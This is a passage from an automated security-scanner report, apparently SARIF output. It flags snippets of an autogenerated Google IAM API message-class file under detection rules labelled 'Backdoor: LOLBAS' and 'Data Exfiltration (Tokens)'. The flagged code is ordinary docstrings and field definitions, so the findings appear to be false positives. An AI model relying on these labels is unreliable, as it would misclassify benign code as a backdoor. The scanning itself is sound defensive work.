                    "text": "  r\"\"\"A IamProjectsServiceAccountsDeleteRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                    "rendered": {
                      "text": "  r\"\"\"A IamProjectsServiceAccountsDeleteRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n",
                      "markdown": "`  r\"\"\"A IamProjectsServiceAccountsDeleteRequest object.\n\n  Fields:\n    name: The resource name of the service account in the following format:\n      `projects/{project}/serviceAccounts/{account}`. Using `-` as a wildcard\n      for the project will infer the project from the account. The `account`\n      value can be the `email` address or the `unique_id` of the service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 258,
                  "startColumn": 5,
                  "endLine": 258,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    createServiceAccountRequest: A CreateServiceAccountRequest resource to be\n      passed as the request body.\n    name: Required. The resource name of the project associated with the\n      service accounts, such as `projects/my-project-123`.\n  \"\"\"\n\n  createServiceAccountRequest = _messages.MessageField('CreateServiceAccountRequest', 1)\n",
                    "rendered": {
                      "text": "    createServiceAccountRequest: A CreateServiceAccountRequest resource to be\n      passed as the request body.\n    name: Required. The resource name of the project associated with the\n      service accounts, such as `projects/my-project-123`.\n  \"\"\"\n\n  createServiceAccountRequest = _messages.MessageField('CreateServiceAccountRequest', 1)\n",
                      "markdown": "`    createServiceAccountRequest: A CreateServiceAccountRequest resource to be\n      passed as the request body.\n    name: Required. The resource name of the project associated with the\n      service accounts, such as `projects/my-project-123`.\n  \"\"\"\n\n  createServiceAccountRequest = _messages.MessageField('CreateServiceAccountRequest', 1)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 205,
                  "startColumn": 59,
                  "endLine": 205,
                  "endColumn": 68,
                  "snippet": {
                    "text": "class Empty(_messages.Message):\n  r\"\"\"A generic empty message that you can re-use to avoid defining duplicated\n  empty messages in your APIs. A typical example is to use it as the request\n  or the response type of an API method. For instance:      service Foo {\n  rpc Bar(google.protobuf.Empty) returns (google.protobuf.Empty);     }  The\n  JSON representation for `Empty` is empty JSON object `{}`.\n  \"\"\"\n",
                    "rendered": {
                      "text": "class Empty(_messages.Message):\n  r\"\"\"A generic empty message that you can re-use to avoid defining duplicated\n  empty messages in your APIs. A typical example is to use it as the request\n  or the response type of an API method. For instance:      service Foo {\n  rpc Bar(google.protobuf.Empty) returns (google.protobuf.Empty);     }  The\n  JSON representation for `Empty` is empty JSON object `{}`.\n  \"\"\"\n",
                      "markdown": "`class Empty(_messages.Message):\n  r\"\"\"A generic empty message that you can re-use to avoid defining duplicated\n  empty messages in your APIs. A typical example is to use it as the request\n  or the response type of an API method. For instance:      service Foo {\n  rpc Bar(google.protobuf.Empty) returns (google.protobuf.Empty);     }  The\n  JSON representation for `Empty` is empty JSON object `{}`.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 186,
                  "startColumn": 68,
                  "endLine": 187,
                  "snippet": {
                    "text": "  r\"\"\"The service account create request.\n\n  Fields:\n    accountId: Required. The account id that is used to generate the service\n      account email address and a stable unique id. It is unique within a\n      project, must be 1-63 characters long, and match the regular expression\n      `[a-z]([-a-z0-9]*[a-z0-9])` to comply with RFC1035.\n    serviceAccount: The ServiceAccount resource to create. Currently, only the\n",
                    "rendered": {
                      "text": "  r\"\"\"The service account create request.\n\n  Fields:\n    accountId: Required. The account id that is used to generate the service\n      account email address and a stable unique id. It is unique within a\n      project, must be 1-63 characters long, and match the regular expression\n      `[a-z]([-a-z0-9]*[a-z0-9])` to comply with RFC1035.\n    serviceAccount: The ServiceAccount resource to create. Currently, only the\n",
                      "markdown": "`  r\"\"\"The service account create request.\n\n  Fields:\n    accountId: Required. The account id that is used to generate the service\n      account email address and a stable unique id. It is unique within a\n      project, must be 1-63 characters long, and match the regular expression\n      `[a-z]([-a-z0-9]*[a-z0-9])` to comply with RFC1035.\n    serviceAccount: The ServiceAccount resource to create. Currently, only the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 183,
                  "startColumn": 9,
                  "endLine": 183,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n\nclass CreateServiceAccountRequest(_messages.Message):\n  r\"\"\"The service account create request.\n\n  Fields:\n    accountId: Required. The account id that is used to generate the service\n",
                    "rendered": {
                      "text": "\n\nclass CreateServiceAccountRequest(_messages.Message):\n  r\"\"\"The service account create request.\n\n  Fields:\n    accountId: Required. The account id that is used to generate the service\n",
                      "markdown": "`\n\nclass CreateServiceAccountRequest(_messages.Message):\n  r\"\"\"The service account create request.\n\n  Fields:\n    accountId: Required. The account id that is used to generate the service\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 152,
                  "startColumn": 9,
                  "endLine": 152,
                  "endColumn": 18,
                  "snippet": {
                    "text": "\n\nclass CreateServiceAccountKeyRequest(_messages.Message):\n  r\"\"\"The service account key create request.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format of the private key.\n",
                    "rendered": {
                      "text": "\n\nclass CreateServiceAccountKeyRequest(_messages.Message):\n  r\"\"\"The service account key create request.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format of the private key.\n",
                      "markdown": "`\n\nclass CreateServiceAccountKeyRequest(_messages.Message):\n  r\"\"\"The service account key create request.\n\n  Enums:\n    PrivateKeyTypeValueValuesEnum: The output format of the private key.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 129,
                  "startColumn": 3,
                  "endLine": 129,
                  "endColumn": 7,
                  "snippet": {
                    "text": "    REGION = 1\n    SERVICE = 2\n    NAME = 3\n    IP = 4\n\n  iam = _messages.EnumField('IamValueValuesEnum', 1)\n  op = _messages.EnumField('OpValueValuesEnum', 2)\n",
                    "rendered": {
                      "text": "    REGION = 1\n    SERVICE = 2\n    NAME = 3\n    IP = 4\n\n  iam = _messages.EnumField('IamValueValuesEnum', 1)\n  op = _messages.EnumField('OpValueValuesEnum', 2)\n",
                      "markdown": "`    REGION = 1\n    SERVICE = 2\n    NAME = 3\n    IP = 4\n\n  iam = _messages.EnumField('IamValueValuesEnum', 1)\n  op = _messages.EnumField('OpValueValuesEnum', 2)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 127,
                  "startColumn": 3,
                  "endLine": 127,
                  "endColumn": 12,
                  "snippet": {
                    "text": "    \"\"\"\n    NO_ATTR = 0\n    REGION = 1\n    SERVICE = 2\n    NAME = 3\n    IP = 4\n\n",
                    "rendered": {
                      "text": "    \"\"\"\n    NO_ATTR = 0\n    REGION = 1\n    SERVICE = 2\n    NAME = 3\n    IP = 4\n\n",
                      "markdown": "`    \"\"\"\n    NO_ATTR = 0\n    REGION = 1\n    SERVICE = 2\n    NAME = 3\n    IP = 4\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 9,
                  "endLine": 123,
                  "endColumn": 13,
                  "snippet": {
                    "text": "      REGION: Region of the resource\n      SERVICE: Service name\n      NAME: Resource name\n      IP: IP address of the caller\n    \"\"\"\n    NO_ATTR = 0\n    REGION = 1\n",
                    "rendered": {
                      "text": "      REGION: Region of the resource\n      SERVICE: Service name\n      NAME: Resource name\n      IP: IP address of the caller\n    \"\"\"\n    NO_ATTR = 0\n    REGION = 1\n",
                      "markdown": "`      REGION: Region of the resource\n      SERVICE: Service name\n      NAME: Resource name\n      IP: IP address of the caller\n    \"\"\"\n    NO_ATTR = 0\n    REGION = 1\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 121,
                  "startColumn": 14,
                  "endLine": 121,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    Values:\n      NO_ATTR: Default non-attribute type\n      REGION: Region of the resource\n      SERVICE: Service name\n      NAME: Resource name\n      IP: IP address of the caller\n    \"\"\"\n",
                    "rendered": {
                      "text": "    Values:\n      NO_ATTR: Default non-attribute type\n      REGION: Region of the resource\n      SERVICE: Service name\n      NAME: Resource name\n      IP: IP address of the caller\n    \"\"\"\n",
                      "markdown": "`    Values:\n      NO_ATTR: Default non-attribute type\n      REGION: Region of the resource\n      SERVICE: Service name\n      NAME: Resource name\n      IP: IP address of the caller\n    \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 115,
                  "startColumn": 42,
                  "endLine": 115,
                  "endColumn": 51,
                  "snippet": {
                    "text": "    DISCHARGED = 5\n\n  class SysValueValuesEnum(_messages.Enum):\n    r\"\"\"Trusted attributes supplied by any service that owns resources and\n    uses the IAM system for access control.\n\n    Values:\n",
                    "rendered": {
                      "text": "    DISCHARGED = 5\n\n  class SysValueValuesEnum(_messages.Enum):\n    r\"\"\"Trusted attributes supplied by any service that owns resources and\n    uses the IAM system for access control.\n\n    Values:\n",
                      "markdown": "`    DISCHARGED = 5\n\n  class SysValueValuesEnum(_messages.Enum):\n    r\"\"\"Trusted attributes supplied by any service that owns resources and\n    uses the IAM system for access control.\n\n    Values:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 77,
                  "startColumn": 43,
                  "endLine": 77,
                  "endColumn": 52,
                  "snippet": {
                    "text": "    iam: Trusted attributes supplied by the IAM system.\n    op: An operator to apply the subject with.\n    svc: Trusted attributes discharged by the service.\n    sys: Trusted attributes supplied by any service that owns resources and\n      uses the IAM system for access control.\n    value: DEPRECATED. Use 'values' instead.\n    values: The objects of the condition. This is mutually exclusive with\n",
                    "rendered": {
                      "text": "    iam: Trusted attributes supplied by the IAM system.\n    op: An operator to apply the subject with.\n    svc: Trusted attributes discharged by the service.\n    sys: Trusted attributes supplied by any service that owns resources and\n      uses the IAM system for access control.\n    value: DEPRECATED. Use 'values' instead.\n    values: The objects of the condition. This is mutually exclusive with\n",
                      "markdown": "`    iam: Trusted attributes supplied by the IAM system.\n    op: An operator to apply the subject with.\n    svc: Trusted attributes discharged by the service.\n    sys: Trusted attributes supplied by any service that owns resources and\n      uses the IAM system for access control.\n    value: DEPRECATED. Use 'values' instead.\n    values: The objects of the condition. This is mutually exclusive with\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 70,
                  "startColumn": 58,
                  "endLine": 70,
                  "endColumn": 67,
                  "snippet": {
                    "text": "  Enums:\n    IamValueValuesEnum: Trusted attributes supplied by the IAM system.\n    OpValueValuesEnum: An operator to apply the subject with.\n    SysValueValuesEnum: Trusted attributes supplied by any service that owns\n      resources and uses the IAM system for access control.\n\n  Fields:\n",
                    "rendered": {
                      "text": "  Enums:\n    IamValueValuesEnum: Trusted attributes supplied by the IAM system.\n    OpValueValuesEnum: An operator to apply the subject with.\n    SysValueValuesEnum: Trusted attributes supplied by any service that owns\n      resources and uses the IAM system for access control.\n\n  Fields:\n",
                      "markdown": "`  Enums:\n    IamValueValuesEnum: Trusted attributes supplied by the IAM system.\n    OpValueValuesEnum: An operator to apply the subject with.\n    SysValueValuesEnum: Trusted attributes supplied by any service that owns\n      resources and uses the IAM system for access control.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 47,
                  "startColumn": 23,
                  "endLine": 47,
                  "endColumn": 32,
                  "snippet": {
                    "text": "      account or a service account.  * `user:{emailid}`: An email address that\n      represents a specific Google    account. For example, `alice@gmail.com`\n      or `joe@example.com`.  * `serviceAccount:{emailid}`: An email address\n      that represents a service    account. For example, `my-other-\n      app@appspot.gserviceaccount.com`.  * `group:{emailid}`: An email address\n      that represents a Google group.    For example, `admins@example.com`.  *\n      `domain:{domain}`: A Google Apps domain name that represents all the\n",
                    "rendered": {
                      "text": "      account or a service account.  * `user:{emailid}`: An email address that\n      represents a specific Google    account. For example, `alice@gmail.com`\n      or `joe@example.com`.  * `serviceAccount:{emailid}`: An email address\n      that represents a service    account. For example, `my-other-\n      app@appspot.gserviceaccount.com`.  * `group:{emailid}`: An email address\n      that represents a Google group.    For example, `admins@example.com`.  *\n      `domain:{domain}`: A Google Apps domain name that represents all the\n",
                      "markdown": "`      account or a service account.  * `user:{emailid}`: An email address that\n      represents a specific Google    account. For example, `alice@gmail.com`\n      or `joe@example.com`.  * `serviceAccount:{emailid}`: An email address\n      that represents a service    account. For example, `my-other-\n      app@appspot.gserviceaccount.com`.  * `group:{emailid}`: An email address\n      that represents a Google group.    For example, `admins@example.com`.  *\n      `domain:{domain}`: A Google Apps domain name that represents all the\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 18,
                  "endLine": 44,
                  "endColumn": 27,
                  "snippet": {
                    "text": "      special identifier that represents anyone who is    on the internet;\n      with or without a Google account.  * `allAuthenticatedUsers`: A special\n      identifier that represents anyone    who is authenticated with a Google\n      account or a service account.  * `user:{emailid}`: An email address that\n      represents a specific Google    account. For example, `alice@gmail.com`\n      or `joe@example.com`.  * `serviceAccount:{emailid}`: An email address\n      that represents a service    account. For example, `my-other-\n",
                    "rendered": {
                      "text": "      special identifier that represents anyone who is    on the internet;\n      with or without a Google account.  * `allAuthenticatedUsers`: A special\n      identifier that represents anyone    who is authenticated with a Google\n      account or a service account.  * `user:{emailid}`: An email address that\n      represents a specific Google    account. For example, `alice@gmail.com`\n      or `joe@example.com`.  * `serviceAccount:{emailid}`: An email address\n      that represents a service    account. For example, `my-other-\n",
                      "markdown": "`      special identifier that represents anyone who is    on the internet;\n      with or without a Google account.  * `allAuthenticatedUsers`: A special\n      identifier that represents anyone    who is authenticated with a Google\n      account or a service account.  * `user:{emailid}`: An email address that\n      represents a specific Google    account. For example, `alice@gmail.com`\n      or `joe@example.com`.  * `serviceAccount:{emailid}`: An email address\n      that represents a service    account. For example, `my-other-\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 1,
                  "endLine": 32,
                  "endColumn": 10,
                  "snippet": {
                    "text": "  \"\"\"\n\n  exemptedMembers = _messages.StringField(1, repeated=True)\n  service = _messages.StringField(2)\n\n\nclass Binding(_messages.Message):\n",
                    "rendered": {
                      "text": "  \"\"\"\n\n  exemptedMembers = _messages.StringField(1, repeated=True)\n  service = _messages.StringField(2)\n\n\nclass Binding(_messages.Message):\n",
                      "markdown": "`  \"\"\"\n\n  exemptedMembers = _messages.StringField(1, repeated=True)\n  service = _messages.StringField(2)\n\n\nclass Binding(_messages.Message):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 24,
                  "endLine": 26,
                  "endColumn": 33,
                  "snippet": {
                    "text": "    exemptedMembers: Specifies the identities that are exempted from \"data\n      access\" audit logging for the `service` specified above. Follows the\n      same format of Binding.members.\n    service: Specifies a service that will be enabled for \"data access\" audit\n      logging. For example, `resourcemanager`, `storage`, `compute`.\n      `allServices` is a special value that covers all services.\n  \"\"\"\n",
                    "rendered": {
                      "text": "    exemptedMembers: Specifies the identities that are exempted from \"data\n      access\" audit logging for the `service` specified above. Follows the\n      same format of Binding.members.\n    service: Specifies a service that will be enabled for \"data access\" audit\n      logging. For example, `resourcemanager`, `storage`, `compute`.\n      `allServices` is a special value that covers all services.\n  \"\"\"\n",
                      "markdown": "`    exemptedMembers: Specifies the identities that are exempted from \"data\n      access\" audit logging for the `service` specified above. Follows the\n      same format of Binding.members.\n    service: Specifies a service that will be enabled for \"data access\" audit\n      logging. For example, `resourcemanager`, `storage`, `compute`.\n      `allServices` is a special value that covers all services.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 47,
                  "endLine": 19,
                  "endColumn": 56,
                  "snippet": {
                    "text": "\n\nclass AuditConfig(_messages.Message):\n  r\"\"\"Enables \"data access\" audit logging for a service and specifies a list\n  of members that are log-exempted.\n\n  Fields:\n",
                    "rendered": {
                      "text": "\n\nclass AuditConfig(_messages.Message):\n  r\"\"\"Enables \"data access\" audit logging for a service and specifies a list\n  of members that are log-exempted.\n\n  Fields:\n",
                      "markdown": "`\n\nclass AuditConfig(_messages.Message):\n  r\"\"\"Enables \"data access\" audit logging for a service and specifies a list\n  of members that are log-exempted.\n\n  Fields:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 4,
                  "startColumn": 25,
                  "endLine": 4,
                  "endColumn": 34,
                  "snippet": {
                    "text": "\"\"\"Generated message classes for iam version v1.\n\nManages identity and access control for Google Cloud Platform resources,\nincluding the creation of service accounts, which you can use to authenticate\nto Google and make API calls.\n\"\"\"\n# NOTE: This file is autogenerated and should not be edited by hand.\n",
                    "rendered": {
                      "text": "\"\"\"Generated message classes for iam version v1.\n\nManages identity and access control for Google Cloud Platform resources,\nincluding the creation of service accounts, which you can use to authenticate\nto Google and make API calls.\n\"\"\"\n# NOTE: This file is autogenerated and should not be edited by hand.\n",
                      "markdown": "`\"\"\"Generated message classes for iam version v1.\n\nManages identity and access control for Google Cloud Platform resources,\nincluding the creation of service accounts, which you can use to authenticate\nto Google and make API calls.\n\"\"\"\n# NOTE: This file is autogenerated and should not be edited by hand.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 927,
                  "startColumn": 3,
                  "endLine": 927,
                  "endColumn": 13,
                  "snippet": {
                    "text": "  callback = _messages.StringField(5)\n  fields = _messages.StringField(6)\n  key = _messages.StringField(7)\n  oauth_token = _messages.StringField(8)\n  pp = _messages.BooleanField(9, default=True)\n  prettyPrint = _messages.BooleanField(10, default=True)\n  quotaUser = _messages.StringField(11)\n",
                    "rendered": {
                      "text": "  callback = _messages.StringField(5)\n  fields = _messages.StringField(6)\n  key = _messages.StringField(7)\n  oauth_token = _messages.StringField(8)\n  pp = _messages.BooleanField(9, default=True)\n  prettyPrint = _messages.BooleanField(10, default=True)\n  quotaUser = _messages.StringField(11)\n",
                      "markdown": "`  callback = _messages.StringField(5)\n  fields = _messages.StringField(6)\n  key = _messages.StringField(7)\n  oauth_token = _messages.StringField(8)\n  pp = _messages.BooleanField(9, default=True)\n  prettyPrint = _messages.BooleanField(10, default=True)\n  quotaUser = _messages.StringField(11)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 886,
                  "startColumn": 5,
                  "endLine": 886,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    pp: Pretty-print response.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n",
                    "rendered": {
                      "text": "    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    pp: Pretty-print response.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n",
                      "markdown": "`    key: API key. Your API key identifies your project and provides you with\n      API access, quota, and reports. Required unless you provide an OAuth 2.0\n      token.\n    oauth_token: OAuth 2.0 token for the current user.\n    pp: Pretty-print response.\n    prettyPrint: Returns response with indentations and line breaks.\n    quotaUser: Available to use for quota purposes for server-side\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/samples/iam_sample/iam_v1/iam_v1_messages.py"
                },
                "region": {
                  "startLine": 806,
                  "startColumn": 40,
                  "endLine": 806,
                  "endColumn": 50,
                  "snippet": {
                    "text": "\n  name = _messages.StringField(1)\n  privateKeyData = _messages.BytesField(2)\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 3)\n  publicKeyData = _messages.BytesField(4)\n  validAfterTime = _messages.StringField(5)\n  validBeforeTime = _messages.StringField(6)\n",
                    "rendered": {
                      "text": "\n  name = _messages.StringField(1)\n  privateKeyData = _messages.BytesField(2)\n  privateKeyType = _messages.EnumField('PrivateKeyTypeValueValuesEnum', 3)\n  publicKeyData = _messages.BytesField(4)\n  validAfterTime = _messages.StringField(5)\n  validBeforeTime = _messages.StringField(6)\n",
